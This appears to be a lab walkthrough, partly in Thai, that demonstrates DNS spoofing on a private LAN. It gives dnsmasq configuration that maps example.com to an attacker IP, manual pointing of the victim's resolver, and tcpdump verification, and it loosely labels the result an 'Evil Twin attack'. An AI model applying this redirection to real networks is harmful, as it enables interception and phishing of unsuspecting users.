DNS Spoofing

1. Lab Environment
Network topology: Simple LAN
Attacker IP: 192.168.147.10
Victim IP: 192.168.147.20
Gateway (optional): 192.168.147.1
Target domain for spoofing: example.com
ใช้ Kali Linux / Debian สำหรับ attacker และ Linux client สำหรับ victim

2. Network Setup
2.1 Attacker Configuration
   # Check interfaces
ip a show eth0

# Assign static IP if not already assigned
sudo ip addr add 192.168.147.10/24 dev eth0
sudo ip link set eth0 up

# Verify IP
ip a show eth0

# Check routing table
ip route
Expected output:
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> ...
    inet 192.168.147.10/24 scope global eth0
    
2.2 Victim Configuration
# Check interfaces
ip a show eth0

# Assign IP if necessary
sudo ip addr add 192.168.147.20/24 dev eth0
sudo ip link set eth0 up

# Set default gateway
sudo ip route add default via 192.168.147.1

# Verify
ip a
ip route


3. Install and Configure dnsmasq on Attacker
3.1 Install dnsmasq
sudo apt update
sudo apt install dnsmasq -y
Check version:
dnsmasq --version

3.2 Configure dnsmasq
Edit config file:
sudo nano /etc/dnsmasq.conf
Add:
listen-address=192.168.147.10
bind-interfaces
address=/example.com/192.168.147.10
no-resolv
listen-address – IP dnsmasq จะฟัง
bind-interfaces – bind เฉพาะ interface
address – mapping domain → IP (spoof)
no-resolv – ไม่ query upstream DNS
Check dnsmasq process:
sudo ss -ulpn | grep :53
3.3 Start dnsmasq manually
sudo pkill dnsmasq  # stop existing
sudo dnsmasq --no-daemon --interface=eth0 --bind-interfaces --no-resolv --address=/example.com/192.168.147.10
Expected Output:
dnsmasq: started, version 2.91 cachesize 150
dnsmasq: read /etc/hosts - 8 names
dnsmasq: warning: no upstream servers configured
4. Configure Victim to Use Attacker DNS
sudo nano /etc/resolv.conf
Add line:
nameserver 192.168.147.10
Test DNS resolution:
dig example.com
ping example.com
Expected result:
example.com resolves to 192.168.147.10
ICMP packets go to Attacker
5. Verify and Capture DNS Traffic
sudo tcpdump -i eth0 port 53 -vv
Sample capture:
09:00:01.123456 IP 192.168.147.20.53321 > 192.168.147.10.53: 12345+ A? example.com
09:00:01.123789 IP 192.168.147.10.53 > 192.168.147.20.53321: 12345 1/0/0 A 192.168.147.10
Explanation:
Victim queries DNS for example.com
Attacker responds immediately with spoofed IP
Victim traffic redirected to Attacker
6. Full Flow Diagram
Victim (192.168.147.20)
       |
       | DNS query: example.com
       v
Attacker (192.168.147.10) -- dnsmasq
       | Respond: example.com -> 192.168.147.10
       v
Victim receives spoofed IP
       |
       | Ping / Connect
       v
Attacker receives traffic
7. Summary
Attacker sets static IP and runs dnsmasq
Victim configured to use Attacker as DNS server
example.com queries redirected to Attacker
DNS spoofing successful – Evil Twin attack demonstrated
